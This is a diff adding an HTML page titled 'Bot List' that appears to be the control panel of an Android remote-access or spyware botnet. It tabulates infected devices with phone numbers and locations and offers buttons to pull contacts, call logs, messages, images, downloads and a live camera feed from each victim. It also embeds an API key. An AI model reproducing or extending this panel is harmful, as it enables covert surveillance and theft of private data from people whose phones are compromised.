@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bot List</title>
+    <link rel="shortcut icon" href="http://alkamalintl.com/wp-content/uploads/2014/12/favicon.png">
+
+
+    <!-- socket.io client lib -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.4/socket.io.js" type="text/javascript"></script>
+    <!--<script type="text/javascript" src="/socket.io/socket.io.js"></script>-->
+
+    <!-- vue.js -->
+    <script src="https://unpkg.com/vue/dist/vue.js"></script>
+    <!-- Compiled and minified JavaScript -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-beta/js/materialize.min.js"></script>
+
+
+    <!-- css file for styling -->
+    <link href="style.css" rel="stylesheet" type="text/css"/>
+    <!-- To use the google Awesome icons -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <!-- Compiled and minified CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-beta/css/materialize.min.css">
+
+</head>
+<body style="position: relative; margin: 16px;">
+
+<h1 style="font-size: 34px; font-family: 'Courier New',serif; color: #0288d1; margin-bottom: 8px; cursor: pointer; display: inline; height: 64px;"
+    onclick="location.reload()">Bot List</h1>
+
+<p id="botStatus" style="float: right; color: #2b542c;"></p>
+<form action="#" style="float: right;">
+    <p>
+        <label>
+            <input id="refresh-check" type="checkbox" />
+            <span style="color: #080808; margin-right: 16px">Refresh</span>
+        </label>
+    </p>
+</form>
+
+<div id="toolBar" style="margin: 8px 8px 16px 0;height: 0; visibility: hidden;">
+    <button class="btn waves-effect waves-light"  onclick="getContacts()" >Contacts<i class="material-icons right">contacts</i></button>
+    <button class="btn waves-effect waves-light"  onclick="getCallLog()"  >Call Log<i class="material-icons right">call</i></button>
+    <button class="btn waves-effect waves-light"  onclick="getMessages()" >Messages<i class="material-icons right">message</i></button>
+    <button class="btn waves-effect waves-light"  onclick="getLocation()" >Location<i class="material-icons right">my_location</i></button>
+    <button class="btn waves-effect waves-light"  onclick="getImages()"   >Images<i class="material-icons right">collections</i></button>
+    <button class="btn waves-effect waves-light"  onclick="getCamera()"   >Camera<i class="material-icons right">camera_alt</i></button>
+    <button class="btn waves-effect waves-light"  onclick="getDownload()"   >Downloads<i class="material-icons right">file_download</i></button>
+</div>
+
+<div id="mainFrame">
+
+
+    <div id="table" class="overlapDiv">
+        <table class="table">
+            <thead>
+            <tr>
+                <th>Device</th>
+                <th>Status</th>
+                <th>Last Seen</th>
+                <th>UID</th>
+                <th>Provider</th>
+                <th>Phone Number</th>
+                <th>Location</th>
+                <th>SDK</th>
+                <th>Version</th>
+            </tr>
+            </thead>
+            <tbody id="indexApp">
+            <tr v-for="bot in bots">
+                <td><a href="#" @click="gotoHome(bot.uid)">{{bot.device}}</a></td>
+                <td class="bot.status? text-success : text-danger ">{{bot.status ? 'ONLINE' : 'OFFLINE'}}</td>
+                <td>{{bot.lastSeen}}</td>
+                <td>{{bot.uid}}</td>
+                <td>{{bot.provider}}</td>
+                <td>{{bot.phone}}</td>
+                <td>{{bot.location.lat}}, {{bot.location.lon}}</td>
+                <td>{{bot.sdk}}</td>
+                <td>{{bot.version}}</td>
+            </tr>
+            <tr>
+                <td v-if="bots.length===0">No bots online</td>
+            </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div id="home" style="visibility: hidden;" class="overlapDiv">Home</div>
+
+    <div id="contacts" style="visibility: hidden; border: 1px solid #ff411b; height: auto; padding: 8px" class="overlapDiv">C</div>
+    <div id="callLog" style="visibility: hidden; border: 1px solid #7cb7ff; height: auto; padding: 8px" class="overlapDiv">CL</div>
+    <div id="messages" style="visibility: hidden; border: 1px solid #54ff87; height: auto; padding: 8px; max-width: 1000px" class="overlapDiv">M</div>
+    <div id="location" style="visibility: hidden; border: 1px solid #d2ffe4; height: 500px; padding: 8px" class="overlapDiv">L</div>
+    <div id="images" style="visibility: hidden; border: 1px solid #fff621; height: auto; padding: 8px; background: #BCBCBC;" class="overlapDiv" onmouseover="mouseStatus(true)" onmouseleave="mouseStatus(false)">I</div>
+    <div id="camera" style="visibility: hidden; border: 1px solid #5a09ff; height: auto; padding: 8px" class="overlapDiv"><video id="live-cam" autoplay style="alignment: center"></video></div>
+    <div id="download" style="visibility: hidden; border: 1px solid #7cb7ff; height: auto; padding: 8px" class="overlapDiv"></div>
+
+</div>
+
+<!-- script file for handling _botDataList -->
+<script src="bot-list.js" type="text/javascript"></script>
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCZvqa0dfN6w2BPvZiQVUD3-30DTLsNpEY&callback=myMap"></script>
+
+</body>
+</html>
